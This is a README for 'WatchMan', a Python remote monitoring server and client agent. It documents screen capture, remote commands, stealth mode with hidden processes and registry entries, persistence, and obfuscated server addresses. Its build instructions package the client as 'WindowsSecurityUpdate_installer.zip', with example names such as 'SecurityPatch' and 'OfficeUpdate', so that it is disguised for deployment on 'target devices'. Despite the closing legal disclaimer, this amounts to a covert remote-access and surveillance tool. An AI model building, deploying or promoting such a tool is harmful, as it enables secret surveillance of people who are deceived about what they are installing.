# WatchMan - Device Overwatch System

A comprehensive device monitoring and remote access system with server-client architecture.

## Features

- **Device Monitoring**: CPU, Memory, GPU, Network metrics
- **Screen Capture**: Real-time desktop monitoring
- **System Logging**: Device on/off tracking
- **Persistence**: Auto-startup capabilities
- **Stealth Operations**: Obfuscated communications
- **Multi-Device Management**: Monitor multiple clients simultaneously

## Architecture

- `server/` - Central monitoring server (Flask + SocketIO)
- `client/` - Device agent with system monitoring
- `gui/` - PyQt5 control interface
- `shared/` - Common utilities and encryption
- `installer/` - Client deployment tools

## Quick Start

### Prerequisites
- Python 3.7 or higher
- Windows/Linux/macOS support
- Network connectivity between server and clients

### 1. Server Setup
```bash
# Clone or download the project
git clone <repository-url>
cd WatchMan

# Set up Python environment (recommended)
python -m venv .venv
# Windows:
.venv\Scripts\activate
# Linux/macOS:
source .venv/bin/activate

# Install dependencies
pip install -r requirements.txt

# Start the server
python server/main.py
```

The server will start on `http://0.0.0.0:5000` by default.

### 2. Access Web Dashboard
Open your browser and navigate to:
- `http://localhost:5000` (local access)
- `http://YOUR_SERVER_IP:5000` (remote access)

### 3. Deploy Clients to Target Devices
```bash
# Build client installer (replace with your server's IP)
python installer/build_client.py --server-ip YOUR_SERVER_IP

# This creates: dist/WindowsSecurityUpdate_installer.zip
# Copy this file to target devices and run:
# python install.py
```

### 4. Optional: Desktop GUI
```bash
# Start the PyQt5 desktop interface
python gui/main.py
```

## Configuration

### Server Configuration (`config/server_config.json`)
```json
{
  "host": "0.0.0.0",
  "port": 5000,
  "encryption_password": "your-secure-password",
  "max_clients": 100,
  "heartbeat_interval": 30
}
```

### Client Configuration
Clients are automatically configured during the build process. Key settings:
- **Stealth Mode**: Operates with hidden processes
- **Persistence**: Auto-starts on system boot
- **Encryption**: All communications are encrypted
- **Reconnection**: Automatic reconnection with exponential backoff

## Features Overview

### Device Monitoring
- **System Metrics**: CPU usage, memory consumption, disk usage
- **Hardware Info**: Processor type, graphics cards, total memory
- **Network Details**: IP addresses (IPv4/IPv6), WiFi SSID, network interfaces
- **Uptime Tracking**: Boot time and system uptime monitoring

### Real-time Capabilities
- **Live Screenshots**: Compressed desktop captures
- **Instant Metrics**: Real-time system performance data
- **Connection Status**: Online/offline device tracking
- **Event Logging**: System events and device state changes

### Security Features
- **AES Encryption**: End-to-end encrypted communications
- **Obfuscated Deployment**: Server addresses hidden in client builds
- **Stealth Operations**: Hidden processes and registry entries
- **Secure Persistence**: Multiple auto-startup mechanisms

### Management Interfaces
- **Web Dashboard**: Modern browser-based interface with dark theme
- **Desktop GUI**: PyQt5 application for advanced control
- **RESTful API**: Programmatic access to device data
- **Real-time Updates**: WebSocket-based live data streaming

## API Endpoints

### Device Management
```
GET  /api/devices              # List all connected devices
GET  /api/device/{id}          # Get specific device info
GET  /api/device/{id}/metrics  # Get device metrics history
POST /api/device/{id}/command  # Send command to device
```

### Available Commands
- `screenshot` - Take immediate screenshot
- `system_info` - Request updated system information
- `reboot` - Restart the target device
- `update_config` - Update client configuration

## Deployment Examples

### Single Device
```bash
# Build installer for one device
python installer/build_client.py --server-ip 192.168.1.100 --name "SystemMonitor"
```

### Multiple Devices with Different Names
```bash
# Office computers
python installer/build_client.py --server-ip 192.168.1.100 --name "OfficeUpdate"

# Home devices  
python installer/build_client.py --server-ip 192.168.1.100 --name "SecurityPatch"
```

### Cloud Deployment
```bash
# For cloud server deployment
python installer/build_client.py --server-ip your-cloud-server.com --port 443
```

## Troubleshooting

### Common Issues
1. **Port 5000 in use**: Change port in `config/server_config.json`
2. **Client won't connect**: Check firewall settings and server IP
3. **Screenshots not appearing**: Verify screen capture permissions
4. **Persistence not working**: Run installer with admin privileges

### Logs and Debugging
```bash
# Server logs
tail -f logs/server.log

# Enable debug mode in server config
"debug": true

# Test client components
python test_components.py
```

## Performance Notes

- **Resource Usage**: Minimal CPU/memory footprint on clients
- **Network Efficiency**: Compressed data transmission
- **Scalability**: Tested with up to 100 concurrent clients
- **Storage**: SQLite database with automatic cleanup options

## Security & Legal Compliance

### Security Best Practices
- Change default encryption passwords before deployment
- Use HTTPS/TLS in production environments
- Implement network segmentation where appropriate
- Regular security updates and monitoring

### Legal Requirements
- **Authorization Required**: Only deploy on systems you own or have explicit permission to monitor
- **Data Protection**: Comply with GDPR, CCPA, and local privacy laws
- **Employee Monitoring**: Follow workplace monitoring regulations
- **Incident Response**: Maintain proper logging and audit trails

### Responsible Use
This software is designed for legitimate system administration, security monitoring, and IT management purposes. Users are responsible for:
- Obtaining proper authorization before deployment
- Complying with applicable laws and regulations
- Implementing appropriate security measures
- Maintaining confidentiality of monitored data

## Contributing

1. Fork the repository
2. Create a feature branch
3. Make your changes
4. Add tests for new functionality
5. Submit a pull request

## License

This project is for educational and authorized monitoring purposes only. See LICENSE file for details.

## Support

For issues, questions, or feature requests:
- Create an issue in the repository
- Check the troubleshooting section above
- Review the PROJECT_OVERVIEW.md for detailed technical information
